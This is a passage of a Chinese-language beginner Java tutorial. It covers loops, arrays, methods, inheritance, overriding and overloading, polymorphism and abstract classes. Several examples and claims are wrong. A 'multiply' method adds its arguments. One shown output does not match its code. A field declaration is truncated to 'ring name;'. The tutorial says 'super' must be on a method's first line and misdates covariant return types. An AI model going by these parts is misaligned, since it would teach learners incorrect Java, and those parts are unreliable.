          for (int i = 1; i < 10; i++) {
              for (int j = 1; j <= i; j++) {
                  if (j == i) {
                      System.out.printf("%d * %d = %d\n", i, j, i*j);
                  }else {
                      System.out.printf("%d * %d = %d\t", i, j, i*j);
                  }
              }
          }
      }
  }
```

##### 运⾏结果

```java
1 * 1 = 1
2 * 1 = 2	2 * 2 = 4
3 * 1 = 3	3 * 2 = 6	3 * 3 = 9
4 * 1 = 4	4 * 2 = 8	4 * 3 = 12	4 * 4 = 16
5 * 1 = 5	5 * 2 = 10	5 * 3 = 15	5 * 4 = 20	5 * 5 = 25
6 * 1 = 6	6 * 2 = 12	6 * 3 = 18	6 * 4 = 24	6 * 5 = 30	6 * 6 = 36
7 * 1 = 7	7 * 2 = 14	7 * 3 = 21	7 * 4 = 28	7 * 5 = 35	7 * 6 = 42	7 * 7 = 49
8 * 1 = 8	8 * 2 = 16	8 * 3 = 24	8 * 4 = 32	8 * 5 = 40	8 * 6 = 48	8 * 7 = 56	8 * 8 = 64
9 * 1 = 9	9 * 2 = 18	9 * 3 = 27	9 * 4 = 36	9 * 5 = 45	9 * 6 = 54	9 * 7 = 63	9 * 8 = 72	9 * 9 = 81
```

#### 2.while循环                                                                                                     

##### 循环3要素

-  变量初始化

-  循环的条件

-  变量改变

##### 语法结构：

```
  变量初始化
  while(循环的条件){
      循环体(变量改变)
  }
```

##### 示例：

###### 打印1-10

```java
  public class WhileDemo {
      public static void main(String[] args) {
          int i = 0;
          while (i <10) {
              System.out.println(i);
              i++;
          }
      }
  }
```

运⾏结果

```java
  0
  1
  2
  3
  4
  5
  6
  7
  8
  9
```

###### 求1-100的和

```java
int i = 1;
int sub = 0;
while (i <= 100) {
    sub += i;
    i++;
}
System.out.println(sub);

//输出
5050
```



#### 3.do-while循环                                                                                                  

do-while循环和while循环的区别是，do-while先循环后判断，while是先判断后循环。

##### 语法结构：

```
  变量初始化
  do{
     循环体(变量改变)
  }while(循环的条件);
```

##### 示例代码：

```java
  public class DoWhileDemo {
      public static void main(String[] args) {
          int i = 0;
          do {
              i++;
              System.out.println("do...while循环输出：" + i);
          }while (i < 10);
      }
  }
```

##### 执⾏结果 

```java
  do...while循环输出：1
  do...while循环输出：2
  do...while循环输出：3
  do...while循环输出：4
  do...while循环输出：5
  do...while循环输出：6
  do...while循环输出：7
  do...while循环输出：8
  do...while循环输出：9
  do...while循环输出：10
```

从结果中可以看到，最后⼀条输出内容是10，

可以看出，代码是先执⾏了do代码块，变量 i 进⾏了⾃增，

然后输出完之后才判断i 已经⼤于10，所以才结束循环。

#### 4.流程跳转                                                                                            

流程跳转关键字：`break`，`continue`

-  `break`：在switch中结束case条件判断，在循环体中结束整个循环语句。

-  `continue`：作⽤在循环体中，结束循环体的本次循环，以及不执⾏关键字continue后⾯的语句，从⽽进⼊下
  次循环。

## 第四节 数组                                                                                            

### ⼀、数组的基本概念                                                                                         

数组是⼀种可以存放相同类型数据的有序集合。

数组的基本特点：

-  在内存中分配连续的空间，每个元素所占⽤的空间⼤⼩是相同的

-  数组的访问是从下标0开始访问的

### ⼆、数组的使⽤                                                                                           

#### 1.数组的声明                                                                                           

有两种格式：

```java
// 1.
数据类型[] 数组名
    
// 2.
数据类型 数组名[]
```

其中数组声明是声明⼀个引⽤变量，即声明⼀个数组对象，数组名就是对象名。

数组声明仅仅是对数组的说明，没有为数组分配任何内存，因此⽅括号[]中并不⽤指出数组中元素的个数。

#### 2.创建数组                                                                                            

创建数组是对数组进⾏初始化，为数组的每个元素分配存储空间。

数组的初始化分为静态初始化和动态初始化。

##### (1)静态初始化

```java
// 静态初始化就是在定义数组的同时进⾏赋值
// 1.
// 数据类型[] 数组名 = {元素1,元素2....};
int[] ages = {18,21,25};

// 2.
// 数据类型[] 数组名 = new 数据类型[]{元素1,元素2....};
int[] ages = new int[]{18,21,24};
```

##### (2)动态初始化

```java
// 动态初始化只确定数组类型和数组⻓度
// 初始化格式
// 数据类型[] 数组名 = new 数组类型[数组⻓度];

// 创建了⼀个⻓度为3的整型数组
int[] arr = new int[3];
// 对数组元素进⾏赋值
arr[0]=1;
arr[1]=2;
arr[2]=3;
```

##### (3)创建数组时的默认值

对数组进⾏创建时未对数组进⾏赋值，则创建的对应的数组将会有⼀个默认值，不同的数组类型有不同的默认值：

![image-20240912151202651](https://image.201068.xyz/assets/32.JAVA/image-20240912151202651.png)

#### 3.二维数组                                                                                                        

数组变量的声明：

```Java
// 数据类型[][] 数组名;
int[][] num;
double[][] d;
String[][] str;
```

数据对象的创建：

```java
// 数组名 = new 数据类型[外⻓度][内⻓度];
int[][] num = new int[4][3];
```

赋值：

```java
// 数组名[外下标][内下标] = 数据;
num[0][0]= 3;
```

数组元素的使⽤及遍历：  

```java
String[][] str = new String[2][3];
str[0] = new String[]{"a", "b", "c"};
str[1] = new String[]{"d", "e", "f"};
for (int i = 0; i < str.length; i++) {
	for (int j = 0; j < str[i].length; j++) {
        System.out.println(str[i][j]);
}
}
// 执⾏结果
a
b
c
d
e
f
```

#### 4.数组常⽤⽅法                                                                                                      

在Java中，常⽤java.util.Arrays 类去操作数组，它提供的所有⽅法都是静态的。

##### (1)数据对比

###### 语法结构：

```java
Arrays.equals(数组1, 数组2);
```

###### 示例：

```java
String[][] str = new String[2][3];
str[0] = new String[]{"a", "b", "c"};
str[1] = new String[]{"d", "e", "f"};
boolean b = Arrays.equals(str[0], str[1]);
System.out.println(b);

// 执⾏结果
false
```

如果两个指定的数组彼此相等，则返回true。

如果两个数组包含相同数量的元素，并且两个数组中的所有对应元素都是相等的，则认为这两个数组时相等的。

换句话说，如果两个数组以相同顺序包含相同的元素，则两个数组是相等的。

同样的⽅法适⽤于其他数据类型。

##### (2)数组排序

###### 语法结构：

```java
Arrays.sort(数组);
```

###### 示例：

```java
int[] num = {1,4,3,6,7,3,5,9};
Arrays.sort(num);
System.out.println(Arrays.toString(num));

// 执⾏结果
[1, 3, 3, 4, 5, 6, 7, 9]
```

sort⽅法对指定对象数组根据其元素的⾃然顺序进⾏**升序排列**。同样的⽅法适⽤于所有的其他基本数据类型（Byte，short，Int等）。

##### (3)填充数组

语法结构：

```java
Arrays.fill(要填充的数组，填充的元素)
```

示例：

```java
String[] s = new String[3];
Arrays.fill(s, "abc");
System.out.println(Arrays.toString(s));

// 执⾏结果
[abc, abc, abc]
```

## 第五节 ⾯向对象                                                                                          

### ⼀、介绍                                                                                              

Java是⼀⻔⾯向对象的编程语⾔，想要⽤⼀两句话解释清楚这个概念，是有⼀定难度的。这⾥先不说什么是⾯向对
象，⽽是先了解什么是计算机。计算机是⼀种⾼速现代化智能电⼦⼯具，主要⽬的是为了⽅便、快速、⾃动化的解
决⽣活中的问题。既然要解决⽣活中的问题，如何让它按照我们预先编排好的指令执⾏就是⾮常重要的，所以为了
解决⽣活中的问题，使⽤计算机语⾔将⽣活中的问题按照顺序分解成⼀个⼀个的执⾏步骤， 然后计算机通过编排的
步骤⼀步⼀步的去执⾏，这样问题就解决了。所以早期使⽤C语⾔编写代码的时候，就是以解决问题的步骤和过程
为中⼼，来设计和开发程序的。这种编写程序的思路和思想，我们就称之为⾯向过程编程。
举个例⼦，要把⼤象装进冰箱总共分⼏步？这就是⼀个经典的⾯向过程的例⼦，它总共分3步。


下⼀个问题，把⼩⽩兔放进冰箱⾥需要⼏步？
答案是什么？

早期我们解决问题的时候，更看中解决问题的过程，所以需要将过程梳理好，将步骤规划好，然后再执⾏，把问题
解决就可以了。这个解决⽅式是没有任何问题的，但是如果我们要解决很多相似问题的时候，每个问题的过程都要
重新梳理，每⼀个步骤都要重新规划，就会变得⽐较麻烦，不⽅便和效率低下的问题就会凸显出来，那么有什么好
的办法呢？


我们换个⻆度想⼀想，既然我们把步骤作为核⼼来分析会存在⼀些问题，那么我们能不能以问题本身为核⼼来进⾏
分析呢？在分析问题的时候，以问题所涉及到的事物为核⼼进⾏分析，⽐如，我们想养⼀个宠物，那么我们以宠物
为核⼼进⾏分析，哪⼀种动物和⼈更亲近⼀些？更好养⼀些？⽣活习性更能接受⼀些？再⽐如，我们想学习计算机
编程语⾔，那么我们可以以计算机编程语⾔为核⼼进⾏分析，哪个语⾔更简单？理解起来更容易，学习体系更丰
富，学完以后⼯资待遇会更⾼，然后根据⾃身的特点去学习，这就是分析的⽅式。
这种⽅式恰恰更贴合我们⽣活中分析问题的⽅式，所以我们分析问题时，完全可以以问题所涉及到的事情和物体为
核⼼去进⾏分析，这⾥的事情和物体我们统称为事物，所以也可以理解为以事物为核⼼的分析。


在英⽂中，事物被翻译成Object，⽽Object这个单词还有另外⼀个中⽂翻译，就是对象，所以以事物为核⼼的分析
⽅式和编程⽅式，更常⻅的说法就是⾯向对象编程。
所谓的⾯向对象，其实是以具体的事或物为中⼼进⾏分析的意思，这种⽅式更符合⽇常⽣活中分析问题的思考⽅
式，所以在现代计算机语⾔中⽤的⾮常多，⾯向对象是⼀种编程思想，它是⼀种分析问题和解决问题的⽅式，我们
通过编程语⾔的语法来体现⾯向对象的思想。Java语⾔就是⾯向对象的，所以提供了很多⾯向对象的语法，通过语
法让我们对⾯向对象编程有更深的理解。

### ⼆、基本语法                                                                                                        

#### 1.创建类                                                                                                         

在IDEA中创建⼀个java类，名为JavaObject，然后在类中创建main⽅法。

  

```
public class JavaObject {
      public static void main(String[] args) {
          

  }

  }
```

#### 2.类与对象                                                                                                        

 

```
 /*
  * TODO ⾯向对象
  * 所谓的⾯向对象，其实就是分析问题时，以问题所涉及到的事或物为中⼼的分析⽅式
  * 类和对象
  * 类表示归纳个整理
  * 对象表示具体的事物
    */
```

#### 3.语法结构                                                                                                        

  * ```
      /*
      * TODO class(类)
      * 类的基本语法结构：
      * class 类名 {
      * 特征（属性）
      * 属性类型 属性名称 = 属性值;
      * 功能（⽅法）
      * 返回值类型 ⽅法名(参数){功能代码}
      * }
        *
      * 创建对象的语法：
      * new 类名();
        */
    ```

    

#### 4.提出问题                                                                                                        

 

```
 /*
  * 问题：养⼀个宠物，哮天⽝
  * 类：宠物，对象：哮天⽝
    */
```

#### 5.分析问题

```
 /*
  *TODO 1.先声明类

  * 特征（属性）
  * 名字
  * 宠物的类型
  * 颜⾊
  * 体型
  * 功能（⽅法）
  * ⾃我介绍
    *TODO 2.创建对象
  * new Pets()
    */
```

#### 6.声明类

```
  class Pets{
      /*

   * 声明属性，所谓的属性其实就是类中的变量
     特征（属性）
        * 名字
          宠物的类型
             * 颜⾊
               体型
                  * */
                    ring name;
                          String type;
                          String color;
                          String body;

  /*

  * 声明⽅法 void ⽅法名(参数){功能代码}
  * 功能（⽅法）
  * ⾃我介绍
  * */
    void infomation(){
    System.out.println("宠物名称："+name);
    System.out.println("宠物类型："+type);
    System.out.println("宠物颜⾊："+color);
    System.out.println("宠物体型："+body);
      }

  }
```

#### 7.创建对象                                                                                                        

```
  Pets p = new Pets();
  p.name = "哮天⽝";
  p.type = "神⽝";
  p.color = "⿊⾊";
  p.body = "像⼈";
```

#### 8.执⾏⽅法                                                                                                        

```
  // ⾃我介绍
  p.infomation();
```

执⾏结果

```
  宠物名称：哮天⽝
  宠物类型：神⽝
  宠物颜⾊：⿊⾊
  宠物体型：像⼈
```

### 三、⽅法                                                                                                          

#### 1.⽅法的定义                                                                                                       

⽅法的定义是指为类添加⼀个新的⽅法，以实现特定的功能或任务。⽅法的定义包括⽅法签名、返回类型、参数列
表和⽅法体。 

##### 示例：

```
  public class ExampleClass {
      // ⽅法定义
      // 返回类型： int
      // ⽅法名：multiply
      // 参数列表：两个整型参数a，b
      public int multiply(int a, int b) {
          // ⽅法体
          int result = a + b;
          return result;   // 返回结果
      }
  }
```

在上⾯示例中，ExampleClass类定义了⼀个名为multiply的⽅法，该⽅法具有两个参数a和b，它们的数据类型是整
型int，⽅法的返回类型也是int，表示该⽅法会返回⼀个整数值。

⽅法的定义通常遵循以下格式：

 

```
 访问修饰符 返回类型 ⽅法名(参数列表){
      // ⽅法体
      // 执⾏特定任务的代码
      return 返回值    // 如果有返回类型的话
  }
```

- ​     访问修饰符：控制其他类是否可以访问该⽅法，例如 public、private、protected 或默认（⽆修饰符）。

-  返回类型：指定⽅法返回的数据类型。如果⽅法不返回任何值，则返回类型为 void。
   ⽅法名：⽅法的名称，⽤于标识该⽅法。
-  参数列表：定义⽅法接受的输⼊参数，可以是零个或多个参数，每个参数包括数据类型和参数名。

-  ⽅法体：包含实际的代码块，定义了⽅法的具体⾏为。

-  返回值：如果⽅法有返回类型，使⽤ return 语句返回计算结果。

通过定义⽅法，我们可以将代码组织成可重⽤的模块，从⽽提⾼代码的可维护性、可读性和灵活性。⽅法还有助于
降低代码重复性，使程序更加模块化和结构化。 

#### 2.⽅法的好处                                                                                                       

提⾼代码复⽤性，使程序逻辑更清晰 

⼯作中经常会出现多⼈需要使⽤相同功能的场景，如果每个程序员都去写⼀遍相同功能，就会出现很多重复的代
码，这时就可以把程序员都要使⽤的功能定义成⼀个⽅法，只需要写⼀次，⼤家就都可以直接调⽤这个⽅法了。

接下来通过案例来介绍⽅法在程序中的好处。

 

```
  public class MethodDemo1 {
      public static void main(String[] args) {
          //员⼯1
          int a = 10;
          int b = 10;
          int c = a+b;
          System.out.println(c);
      //员⼯2
      int a1 = 15;
      int b1 = 12;
     int c1 = a1+b1;
      System.out.println(c1);

     //员⼯3
     int a2 = 23;
     int b2 = 14;
    int c2 = a2+b2;
     System.out.println(c2);
  }

  }
```

上述代码中，3个员⼯分别做了求和操作，仔细观察会发现，这3个求和的代码是重复的，都在做⼀样的事情。此
时，就可以将求和的功能定义为⽅法，在程序中调⽤三次即可，修改后的代码如下所示。 

```
  public class MethodDemo1 {
      public static void main(String[] args) {
          //员⼯1
          int c = sum(10,10);//调⽤sum()⽅法，实现求两数之和
          System.out.println(c);
      //员⼯2
     int c1 = sum(15,12);
      System.out.println(c1);

      //员⼯3
      int c2 = sum(23,14);
     System.out.println(c2);
  }
  //定义求和⽅法，返回值为两个整数的和
  public static int sum(int a,int b){
      int c = a+b;
     return c;
  }

  }
```

注意：⽅法定义好后，必须进⾏调⽤才能被执⾏，调⽤格式：⽅法名称(…)。

#### 3.其他写法                                                                                                        

⽅法定义时：返回值类型、形参列表可以按照需求进⾏填写。 

例如：

```
 //打印3⾏Hello World
  public static void print(){
      System.out.println("Hello World");
      System.out.println("Hello World");
      System.out.println("Hello World");
  }
```

上述代码要求直接打印出3⾏Hello World，不需要传参数，也不需要有返回值。

#### 4.常⻅问题                                                                                                        

-  ⽅法在程序中的编写顺序⽆所谓。

-  ⽅法与⽅法之间是平级关系，不能嵌套定义。

-  如果⽅法不需要返回结果，返回值类型必须声明成void(⽆返回值)，此时⽅法内部不可以使⽤return返回数
   据。

-  ⽅法如果没有参数，或者返回值类型声明为void可以称为⽆参数、⽆返回值的⽅法，依此类推。

-  return语句下⾯不能编写代码，因为永远执⾏不到，属于⽆效代码。
   ⽅法不调⽤就不执⾏，调⽤时必须严格匹配⽅法的参数情况。

-  有返回值的⽅法调⽤时可以选择定义变量接收结果，或者直接输出调⽤，甚⾄直接调⽤；⽆返回值⽅法的调⽤
   只能直接调⽤⼀下。

#### 5.⽅法案例                                                                                                        

##### (1)计算1-N的和返回

- 需求：定义⼀个⽅法，在⽅法中计算出 1-N的和并返回。

- 分析：

  - 因为N为不固定值，所以⽅法需要声明形参接收数据；

  - 需求中要求有返回结果，所以需声明返回值类型。

  - ⽅法内部使⽤ for 循环计算出 1-n 的和并返回。

示例

```java
public class MethodDemo {
      public static void main(String[] args) {
          int n = 100;
          int result = sum(n);
          System.out.printf("1到%d的和是%d\n", n, result);
      }

  public static int sum(int n) {
      int temp = 0;
      for (int i = 0; i<=n; i++) {
          temp += i;
      }
      return temp;
  }
}

// 执⾏结果
1到100的和是5050
```

  

> 定义⽅法重点关注两点：
>
> ⽅法是否需要声明返回值类型。
>
> ⽅法是否需要定义形参列表。
>

##### (2)判断整数时奇数还是偶数

-  需求：输⼊⼀个整数，调⽤⽅法输出该数为奇数还是偶数。

-  分析：

  - 因为需要传⼊数据给⽅法，所以⽅法需要声明形参接收。

  - ⽅法内部使⽤if语句判断，并输出对应的结论。

示例：

```java
public class publicDemo {
    public static void main(String[] args) {
        System.out.println(check(2));
        System.out.println(check(3));
    }

    public static String check(int num) {
        if (num%2 == 0) {
            return "偶数";
        }else {
            return "奇数";
        }
    }
}

// 执⾏结果
11是奇数
```

##### (3)数组求最值改⽅法实现

-  需求：把找出数组的最⼤值案例，改造成⽅法，可以⽀持返回任意整型数组的最⼤值数据。

-  分析：

  - 根据格式编写⽅法

    -  要返回最⼤值，需要声明返回值类型。

    -  需要接收数组, 需要声明形参列表。
  - ⽅法内部找出数组的最⼤值并返回。

示例：

```java
public class MethodDemo {
      public static void main(String[] args) {
          int[] arr = {1,5,3,2,23,6,4};
          int max = maxNum(arr);
          System.out.printf("数组最⼤的值是%d\n", max);
      }
      
  public static int maxNum(int[] arr){
      int temp = 0;
      for (int i = 0; i < arr.length; i++) {
          if (arr[i] > temp) {
              temp = arr[i];
          }
      }
      return temp;
  }
}
//执⾏结果
数组最⼤的值是23
```

### 四、继承                                                                                                          

Java继承是⾯向对象编程中的重要概念，它可以让⼦类继承⽗类的属性和⽅法，并在此基础上进⾏扩展和重写。这
⾥将深⼊探讨Java继承的概念、语法、特性、应⽤和优化，使我们更好地理解和应⽤继承。

#### 1.什么是继承                                                                                                       

继承是指⼀个类（⼦类）可以继承另⼀个类（⽗类）的属性和⽅法。

⼦类可以在继承的基础上进⾏扩展和重写，从⽽实现代码的复⽤和灵活性。

在Java中，使⽤`extends`关键字来实现继承。

-  ⼦类会⾃动拥有⽗类定义的属性和⽅法

-  ⽗类⼜叫超类，基类

-  ⼦类⼜叫派⽣类

#### 2.如何定义⼀个⼦类                                                                                                    

定义⼦类的语法如下：

```java
public class ⼦类名 extends ⽗类名 {
    // ⼦类的属性和⽅法
}
```

在⼦类中，可以继承⽗类的属性和⽅法，并定义⾃⼰的属性和⽅法。例如：

```java
public class ExtendsDemo {

    public static void main(String[] args) {

        Animal a = new Animal();
        a.name = "⽼⻁";
        a.information();

        Pets p = new Pets();
        p.name = "哮天⽝";
        p.color = "⿊⾊";
        p.type = "神⽝";
        p.body = "像⼈";
        p.information();
        p.eat();
    }

}

class Animal {
    String name;

    void information() {
        System.out.printf("%s在奔跑。。。\n", name);
    }

}
class Pets extends Animal {
    String color;
    String type;
    String body;

    @Override
    void information() {
        System.out.println("宠物名称："+name);
        System.out.println("宠物类型："+type);
        System.out.println("宠物颜⾊："+color);
        System.out.println("宠物体型："+body);
    }

    void eat() {
        System.out.printf("%s在吃东⻄\n", name);
    }

}

// 执⾏结果
⽼⻁在奔跑。。。
宠物名称：哮天⽝
宠物类型：神⽝
宠物颜⾊：⿊⾊
宠物体型：像⼈
哮天⽝在吃东⻄
```

#### 3.继承的特性                                                                                                       

- ⼦类拥有⽗类⾮ private 的属性、⽅法。

- ⼦类可以拥有⾃⼰的属性和⽅法，即⼦类可以对⽗类进⾏扩展。

- ⼦类可以⽤⾃⼰的⽅式实现⽗类的⽅法。

**Java 的继承是单继承，但是可以多重继承**。

单继承就是⼀个⼦类只能继承⼀个⽗类，

多重继承就是，例如 B 类继承 A 类，C 类继承 B 类，所以按照关系就是 B 类是 C 类的⽗类，A 类是 B 类的⽗类，这是 Java 继承区别于 C++ 继承的⼀个特性。

提⾼了类之间的耦合性（继承的缺点，耦合度⾼就会造成代码之间的联系越紧密，代码独⽴性越差）。

#### 4.super和this关键字                                                                                               

`super`关键字：我们可以通过super关键字来实现对**⽗类成员**的访问，⽤来引⽤当前对象的⽗类。

`this`关键字：**指向⾃⼰**的引⽤。

```java
public class ExtendsDemo {

  public static void main(String[] args) {

      Animal a = new Animal();
      a.name = "⽼⻁";
      a.information();
      Pets p = new Pets();
      p.name = "哮天⽝";
      p.color = "⿊⾊";
      p.information();
      p.run();
	}

  }

  class Animal {
      String name;

      void information() {
          System.out.printf("%s在奔跑。。。\n", name);
      }

  }

  class Pets extends Animal {
      String color;

      @Override
      void information() {
          System.out.println("宠物名称："+name);
          System.out.println("宠物颜⾊："+color);
  		}

      void run(){
          super.information();
      }

  }

// 执⾏结果
⽼⻁在奔跑。。。
宠物名称：哮天⽝
宠物颜⾊：⿊⾊
哮天⽝在奔跑。。。
```

#### 5.final关键字                                                                                                    

`final` 可以⽤来修饰变量（包括类属性、对象属性、局部变量和形参）、⽅法（包括类⽅法和对象⽅法）和类。

final 含义为 "**最终的**"。

使⽤ final 关键字声明类，就是把类定义定义为最终类，**不能被继承**，或者⽤于修饰⽅法，该⽅法不能被⼦类重写。

例如String类，它是不可以被继承的类：

```java
public final class String
```

#### 5.抽象类和接⼝的继承                                                                                       

抽象类和接⼝是Java中重要的概念，它们都可以被继承。

**抽象类是⼀个不能被实例化的类**，它可以包含抽象⽅法和⾮抽象⽅法。

**接⼝是⼀个包含抽象⽅法、常量和默认⽅法的类**。

在Java中，**⼀个类只能继承⼀个抽象类，但可以实现多个接⼝**。

例如：

```JAVA
public abstract class Animal {
  	public abstract void eat();
  }

  public interface Flyable {
      void fly();
  }

  public class Dog extends Animal implements Flyable {
      public void eat() {
          System.out.println("Dog is eating...");
      }

      public void fly() {
          System.out.println("Dog is flying...");
      }

}
```

在这个例⼦中，Dog类继承了Animal类和实现了Flyable接⼝。

#### 6.继承的好处和使⽤场景                                                                                      

继承的好处是可以实现代码的复⽤和灵活性。通过继承，⼦类可以继承⽗类的属性和⽅法，并在此基础上进⾏扩展和重写。继承的使⽤场景包括：

-  实现代码的复⽤和扩展

-  实现多态和动态绑定

-  实现框架和模板设计

#### 7.继承的注意事项                                                                                         

继承虽然可以实现代码的复⽤和灵活性，但也存在⼀些注意事项。

##### (1)最⼩化继承

继承的层次越深，代码的复杂度和耦合度就越⾼。因此，应尽量最⼩化继承，避免过度继承和滥⽤继承。

如果⼀个类只需要使⽤⽗类的⼀部分功能，可以考虑使⽤组合或委托来代替继承。

##### (2)⽗类设计的合理性

⽗类的设计应该符合实际情况和业务需求，不能过于抽象或不合理。

如果⽗类的设计不好，就会影响到⼦类的设计和继承。因此，应该在设计⽗类时考虑到⼦类的继承需求和扩展性。

##### (3)⽅法的访问权限

在继承中，⼦类可以继承⽗类的public和protected⽅法，但不能继承private⽅法。

如果⼀个⽅法不想被⼦类继承或重写，可以将其声明为final或private。

如果⼀个⽅法想被⼦类继承但不想被重写，可以将其声明为final。

##### (4)⽅法的重写规则

在继承中，⼦类重写⽗类的⽅法时，要遵循以下规则：

-  ⽅法名、参数列表和返回值类型必须和⽗类⼀致。

-  访问权限不能低于⽗类。

-  ⽗类的final⽅法不能被重写。
   
-  ⼦类的⽅法不能抛出⽐⽗类更多的异常。
##### (5)super关键字的使⽤

在⼦类中，可以使⽤super关键字来调⽤⽗类的构造⽅法、属性和⽅法。但super关键字也存在⼀些使⽤上的注意事项：

-  在构造⽅法中，必须在第⼀⾏调⽤⽗类的构造⽅法。

-  在静态⽅法和属性中，不能使⽤super关键字。

-  在⽅法中，super关键字必须在⽅法体的第⼀⾏使⽤。

### 五、重写（Override）与重载（Overload）                                                                       

#### 1.重写（Override）                                                                                    

重写是⼦类对⽗类的允许访问的⽅法的实现过程进⾏**重新编写**, **返回值和形参都不能改变**。即外壳不变，核⼼重写！

-  重写的好处在于⼦类可以根据需要，**定义特定于⾃⼰的⾏为**。 也就是说⼦类能够根据需要实现⽗类的⽅法。

-  **重写⽅法不能抛出新的检查异常或者⽐被重写⽅法申明更加宽泛的异常**。例如： ⽗类的⼀个⽅法申明了⼀个检查异常 IOException，但是在重写这个⽅法的时候不能抛出 Exception 异常，因为 Exception 是 IOException 的⽗类，抛出 IOException 异常或者 IOException 的⼦类异常。
   
   在⾯向对象原则⾥，重写意味着可以重写任何现有⽅法。

示例：

```java
public class Animal{
     public void move(){
        System.out.println("动物可以移动");
     }
}

public class Dog extends Animal{
    public void move(){
        System.out.println("狗可以跑和⾛");
    }
}
	
public class TestDog{
    public static void main(String args[]){
        Animal a = new Animal(); // Animal 对象
        Animal b = new Dog(); // Dog 对象
        a.move();// 执⾏ Animal 类的⽅法
        b.move();//执⾏ Dog 类的⽅法
    }
}

// 执⾏结果
动物可以移动
狗可以跑和⾛
```

#### 2.⽅法的重写规则                                                                                         

-  参数列表与被重写⽅法的参数列表必须完全相同。

-  返回类型与被重写⽅法的返回类型可以不相同，但是必须是⽗类返回值的派⽣类（java5 及更早版本返回类型
   要⼀样，java7 及更⾼版本可以不同）。

-  访问权限不能⽐⽗类中被重写的⽅法的访问权限更低。例如：如果⽗类的⼀个⽅法被声明为 public，那么在
   ⼦类中重写该⽅法就不能声明为 protected。
-  ⽗类的成员⽅法只能被它的⼦类重写。
-  声明为 final 的⽅法不能被重写。

-  声明为 static 的⽅法不能被重写，但是能够被再次声明。

-  ⼦类和⽗类在同⼀个包中，那么⼦类可以重写⽗类所有⽅法，除了声明为 private 和 final 的⽅法。

-  ⼦类和⽗类不在同⼀个包中，那么⼦类只能够重写⽗类的声明为 public 和 protected 的⾮ final ⽅法。
-  重写的⽅法能够抛出任何⾮强制异常，⽆论被重写的⽅法是否抛出异常。但是，重写的⽅法不能抛出新的强制性异常，或者⽐被重写⽅法声明的更⼴泛的强制性异常，反之则可以。
-  构造⽅法不能被重写。

-  如果不能继承⼀个类，则不能重写该类的⽅法。

#### 3.重载（Overload）                                                                                    

重载(overloading) 是在⼀个类⾥⾯，**⽅法名字相同，⽽参数不同**。返回类型可以相同也可以不同。

-  每个重载的⽅法（或者构造函数）都必须有⼀个独⼀⽆⼆的参数类型列表。

-  最常⽤的地⽅就是构造器的重载。

示例：

```java
public class OverloadDemo {
      public static void main(String[] args) {
          OverloadDemo o = new OverloadDemo();
          o.test(123);
          o.test(12,34);
          o.test("Hello", "world");
      }

      public void test(int a) {
          System.out.println("当前⽅法只有⼀个参数，它的值是" + a);
      }
      public int test(int a, int b) {
          int temp = a + b;
          System.out.println("当前⽅法有两个整型参数，它们的和是"+temp);
          return temp;
      }

      public String test(String s1, String s2) {
          String temp = s1 + s2;
          System.out.println("当前⽅法有两个字符串参数，它们拼接后是："+temp);
          return temp;
      }

}

//执⾏结果
当前⽅法只有⼀个参数，它的值是123
当前⽅法有两个整型参数，它们的和是46
当前⽅法有两个字符串参数，它们拼接后是：Helloworld
```

#### 4.⽅法重装规则                                                                                                      

-  被重载的⽅法必须改变参数列表(参数个数或类型不⼀样)；
-  被重载的⽅法可以改变返回类型；
-  被重载的⽅法可以改变访问修饰符；

-  被重载的⽅法可以声明新的或更⼴的检查异常；

-  ⽅法能够在同⼀个类中或者在⼀个⼦类中被重载。

-  ⽆法以返回值类型作为重载函数的区分标准。

#### 5.重写与重载的区别 

![image-20240912154331920](https://image.201068.xyz/assets/32.JAVA/image-20240912154331920.png)

### 六、多态                                                                                                          

Java中使⽤多态的主要⽬的是提⾼代码的**可重⽤性**和**扩展性**，使得代码更加灵活和易于维护。

通过多态，我们可以将不同的对象看做是同⼀种类型，从⽽使得我们可以使⽤同⼀种接⼝来操作这些对象，⽽不必关⼼具体的实现细节。

#### 1.多态的定义                                                                                                       

多态是⾯向对象编程中的⼀个重要概念，它指的是**同⼀个对象在不同情况下具有不同的表现形式和功能**。

在Java中，多态是指同⼀个类型的对象，在不同的情况下可以表现出不同的⾏为。

#### 2.使⽤多态的前提条件                                                                                                   

-  必须在**继承体系下**，⼦类必须继承⽗类

-  ⼦类必须要对⽗类中⽅法进⾏**重写**

-  通过⽗类的引⽤**调⽤重写的⽅法** (对于重写不在此处介绍)

当使⽤多态⽅式调⽤⽅法时，⾸先检查⽗类中是否有该⽅法，如果没有，则编译错误；如果有，再去调⽤⼦类的同名⽅法。

#### 3.代码示例                                                                                                        

```java
class Animal {
     public void sound() {
        System.out.println("The animal makes a sound");
     }
}

class Cat extends Animal {
    public void sound() {
        System.out.println("The cat meows");
    }
}

class Dog extends Animal {
    public void sound() {
        System.out.println("The dog barks");
    }
}

public class Main {
    public static void main(String[] args) {
        Animal myAnimal = new Animal();
        Animal myCat = new Cat();
        Animal myDog = new Dog();

        myAnimal.sound();
        myCat.sound();
        myDog.sound();
    }
}

// 执⾏结果
The animal makes a sound
The cat meows
The dog barks
```

#### 4.多态的优点                                                                                           

-  消除类型之间的耦合关系

-  可替换性

-  可扩充性

-  接⼝性

-  灵活性

-  简化性

>    解释：
>
>    什么是消除类型之间的耦合关系？
>
>    多态的⼀个重要特点是能够消除类型之间的耦合关系。在⾯向对象的编程中，耦合关系描述的是不同类或者
>    模块之间的相互依赖程度。如果两个类之间存在紧密的耦合关系，那么当其中⼀个类发⽣变化时，另⼀个类
>    也可能需要做出相应的调整，这增加了代码的复杂性和维护成本。
>
>    多态通过引⼊⽗类引⽤和⼦类实现的⽅式，降低了类之间的耦合程度。具体来说，这种机制有效地消除了类
>    型之间的耦合关系。因为⽗类引⽤可以指向任何实现了⽗类接⼝或继承了⽗类的⼦类对象，所以我们可以轻
>    松地替换⼦类实现，⽽⽆需修改⽗类代码或修改使⽤⽗类引⽤的代码。这使得代码更加模块化、可维护和可
>    扩展。
>
>    因此，多态通过消除类型之间的耦合关系，提⾼了代码的健壮性、可维护性和可扩展性，是⾯向对象编程中
>    ⼀种⾮常重要的特性。

### 七、抽象类                                                                                             

#### 1.定义                                                                                              

对于⼀个没有⽅法体的⽅法叫做抽象⽅法，抽象⽅法是抽象类的核⼼。抽象类中可以没有抽象abstract修饰。

在Java中，⼀个没有具体实现的⽅法的类可以被定义为抽象类。这个类不能被实例化，只能被继承。继承⼀个抽象
类的⼦类必须实现⽗类中的抽象⽅法。

#### 2.特点                                                                                              

1. ①抽象类中可以有常量，还可以有变量。

2. ②抽象类中可以有/没有抽象⽅法，也可以有⾮抽象⽅法。

